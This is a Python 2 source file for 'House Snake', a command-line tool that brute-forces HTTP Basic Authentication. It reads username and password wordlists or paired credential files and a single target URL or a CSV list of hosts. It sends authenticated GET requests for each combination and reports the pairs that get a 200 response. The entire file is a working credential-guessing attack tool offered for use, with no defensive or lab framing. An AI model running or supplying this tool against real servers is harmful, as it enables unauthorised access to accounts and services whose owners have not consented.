#!/usr/bin/python2

import requests
import argparse
import json
import csv
import subprocess
from termcolor import colored
from pyfiglet import Figlet

try:
    #Some empty arrays and an empty dictionary
    passwordList = []
    usernameList = []
    targets = []
    results = []
    output = {}

    #The list of terminal arguments that are needed to run the program.
    parser = argparse.ArgumentParser(description="Used to Brute Force HTTP Basic Authentication", conflict_handler='resolve')
    group1 = parser.add_mutually_exclusive_group()
    group2 = parser.add_mutually_exclusive_group()
    group3 = parser.add_mutually_exclusive_group()
    parser.add_argument('-i', type=str, help="Path to File Containing Username and Password Pairs")
    group1.add_argument('-u', type=str, help="Path to Username File")
    group1.add_argument('-U', type=str, help="Username")
    group2.add_argument('-p', type=str, help="Path to Paswords File")
    group2.add_argument('-P', type=str, help="Pasword")
    group3.add_argument('-t', type=str, help="Path to Url File in CSV format")
    group3.add_argument('-T', type=str, help="Full Target Url (www.target.com)")
    parser.add_argument('-o', help="Will Output Results to output.json", action="store_true")
    parser.add_argument("-v", help="Display All Attempted Username and Passwords", action="store_true")
    args = parser.parse_args()

    #Will clear the terminal for some neatness.
    subprocess.call(["clear"])

    #Displays the name of the script in a formated banner.
    f = Figlet(font='slant')
    print(colored(f.renderText('House Snake'), "yellow"))
    print(colored("Created By Vodi Jahar", "blue"))
    print(' ')

    #Takes a list of usernames and appends the names to an array.
    def createUserList(dict_file):
        if args.U == None:
            d = open(dict_file)
            for line in d.readlines():
                user = line.strip('\n')
                usernameList.append(user)
        else:
            usernameList.append(dict_file)

    #Takes a list of passwords and appends them to an array.
    def createPassList(dict_file):
        if args.P == None:
            d = open(dict_file)
            for line in d.readlines():
                password = line.strip('\n')
                passwordList.append(password)
        else:
            passwordList.append(dict_file)

    def createTargetList(dict_file):
            with open (dict_file)  as csvfile:
                for row in csvfile:
                    x = row.split(',')
                    target = x[0] + ":" + x[1]
                    target = target.rstrip("\n")
                    targets.append(target)

    #Main bruteforcing function. Makes a Get request to a target url. Adds a username and password to the request.
    #If the username and passowrd pair get a 200 ok status code, the pair is printed to the terminal.
    def bruteForce(url):
        count = 0

        try:
            for usr in usernameList:
                for pwd in passwordList:
                    content = requests.get("http://" + url, auth=(usr, pwd))
                    if content.status_code == 200:
                        count += 1
                        result = (usr + ', ' + pwd)
                        print (colored('[+] ' + result, "green"))
                        print(' ')
                        results.append(result + ', ' + url)

                    elif args.v == True:
                        failed = ('[-] ' + usr + ", " + pwd)
                        print(colored(failed, "red"))
                        print(' ')
                        results.append(failed)

                    output.update({'userpass': results})

            #Just a simple way to report the amount of successful username and password pairs for a target url.
            if count == 0:
                print(colored("No Valid Usernames or Passwords Found for " + url, "red") + "\n")
            elif count == 1:
                print("Found " + str(count) + " Username and Password Pair " + "for " + url + "\n")
            else:
                print("Found " + str(count) + " Username and Password Pairs " + "for " + url + "\n")

        except requests.exceptions.RequestException as e:
            print(colored("Unable to Connect to Target: " + url, "yellow"))
            print(' ')
            pass

    def bruteForce2(url):
        count = 0
        i=0
        try:
            for usr in usernameList:
                content = requests.get("http://" + url, auth=(usr, passwordList[i]))
                if content.status_code == 200:
                    count += 1
                    result = (usr + ', ' + passwordList[i])
                    print (colored('[+] ' + result, "green"))
                    print(' ')
                    results.append(result + ', ' + url)

                elif args.v == True:
                    failed = ('[-] ' + usr + ", " + passwordList[i])
                    print(colored(failed, "red"))
                    print(' ')
                    results.append(failed)

                output.update({'userpass': results})
                i=i+1

            #Just a simple way to report the amount of successful username and password pairs for a target url.
            if count == 0:
                print(colored("No Valid Usernames or Passwords Found for " + url, "red") + "\n")
            elif count == 1:
                print("Found " + str(count) + " Username and Password Pair " + "for " + url + "\n")
            else:
                print("Found " + str(count) + " Username and Password Pairs " + "for " + url + "\n")

        except requests.exceptions.RequestException as e:
            print(colored("Unable to Connect to Target: " + url, "yellow"))
            print(' ')
            pass

    #Checks to see which mutually exculsive arguments are called and acts accordingly.
    try:
        if args.i != None:
            userpass = args.i
            d = open(userpass)
            for line in d.readlines():
                x = line.split(', ')
                a = x[0]
                b = x[1]
                username = a.rstrip("\n")
                usernameList.append(username)
                wordlist = b.rstrip("\n")
                passwordList.append(wordlist)

        else:
            if args.u == None:
                username = args.U
            else:
                username = args.u

            createUserList(username)

            if args.p == None:
                wordlist = args.P
            else:
                wordlist = args.p

            createPassList(wordlist)

        if args.t == None:
            url = args.T
            if args.i == None:
                bruteForce(url)
            else:
                bruteForce2(url)
            print(' ')
        else:
            url = args.t
            createTargetList(url)
            for u in targets:
                if args.i == None:
                    bruteForce(u)
                else:
                    bruteForce2(u)

    #If a type error is encountered the script help is displayed.
    except TypeError:
        parser.print_help()

    if args.o == True:
        with open('output.json', 'w') as outfile:
            json.dump(output, outfile, indent=2)

#Checks for user interruption and stops the program without displaying an error.
except KeyboardInterrupt:
    print(" - USER INTERRUPTED")
    pass
